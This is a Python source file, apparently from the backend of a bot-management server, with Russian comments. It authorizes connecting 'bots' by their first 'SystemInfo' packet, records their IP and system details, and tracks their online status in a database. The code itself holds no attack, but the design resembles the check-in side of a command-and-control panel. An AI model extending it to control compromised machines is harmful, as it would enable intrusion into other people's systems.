# backend/Services/Auth.py

import asyncio
import json
from typing import Any, Dict, Optional, Tuple, Union

import backend.LoggerWrapper as logger
from backend.Database import db_get_bots, db_update_bot
from .network import read_packet


async def authorize_bot(
    reader: asyncio.StreamReader, 
    ip_address: str
) -> Optional[Tuple[str, Dict[str, Any]]]:
    """
    Выполняет первичную авторизацию бота при подключении.
    
    Схема данных:
    [Packet] -> (bot_id, module, payload)
    Авторизация успешна, если module == "SystemInfo".
    """
    try:
        packet: Tuple[str, str, Union[dict, str, bytes]] = await asyncio.wait_for(
            read_packet(reader), 
            timeout=10
        )
        
        if not (bot_identifier := packet[0]):
            return None

        module_name: str = packet[1]
        payload_data: Union[dict, str, bytes] = packet[2]

        if module_name == "SystemInfo" and isinstance(payload_data, dict):
            if payload_data.get("ip") in ["0.0.0.0", "127.0.0.1", None]:
                payload_data["ip"] = ip_address
            
            return bot_identifier, sync_bot_data(bot_identifier, payload_data)

    except Exception as error:
        logger.Log.error(f"[Auth] Authorization Error: {error}")
    
    return None


def get_full_db() -> Dict[str, Any]:
    """
    Запрос всех записей из базы данных ботов.
    """
    return db_get_bots()


def sync_bot_data(bot_identifier: str, payload: Dict[str, Any]) -> Dict[str, Any]:
    """
    Синхронизация состояния бота с базой данных.
    
    Фильтрация мусорных значений: [None, "", "??", "Loading...", "Idle"].
    Схема обновления: [Payload] -> DB_Update -> Info_Object.
    """
    database_state: Dict[str, Any] = get_full_db()
    bot_info: Dict[str, Any] = database_state.get(bot_identifier, {"id": bot_identifier})
    invalid_entries: list = [None, "", "??", "Loading...", "Idle"]
    
    clean_payload: Dict[str, Any] = {
        key: value for key, value in payload.items() 
        if value not in invalid_entries
    }
    
    bot_info.update(clean_payload)
    bot_info["status"] = "offline" if payload.get("status") == "offline" else "online"
    
    db_update_bot(bot_identifier, bot_info)
    
    return bot_info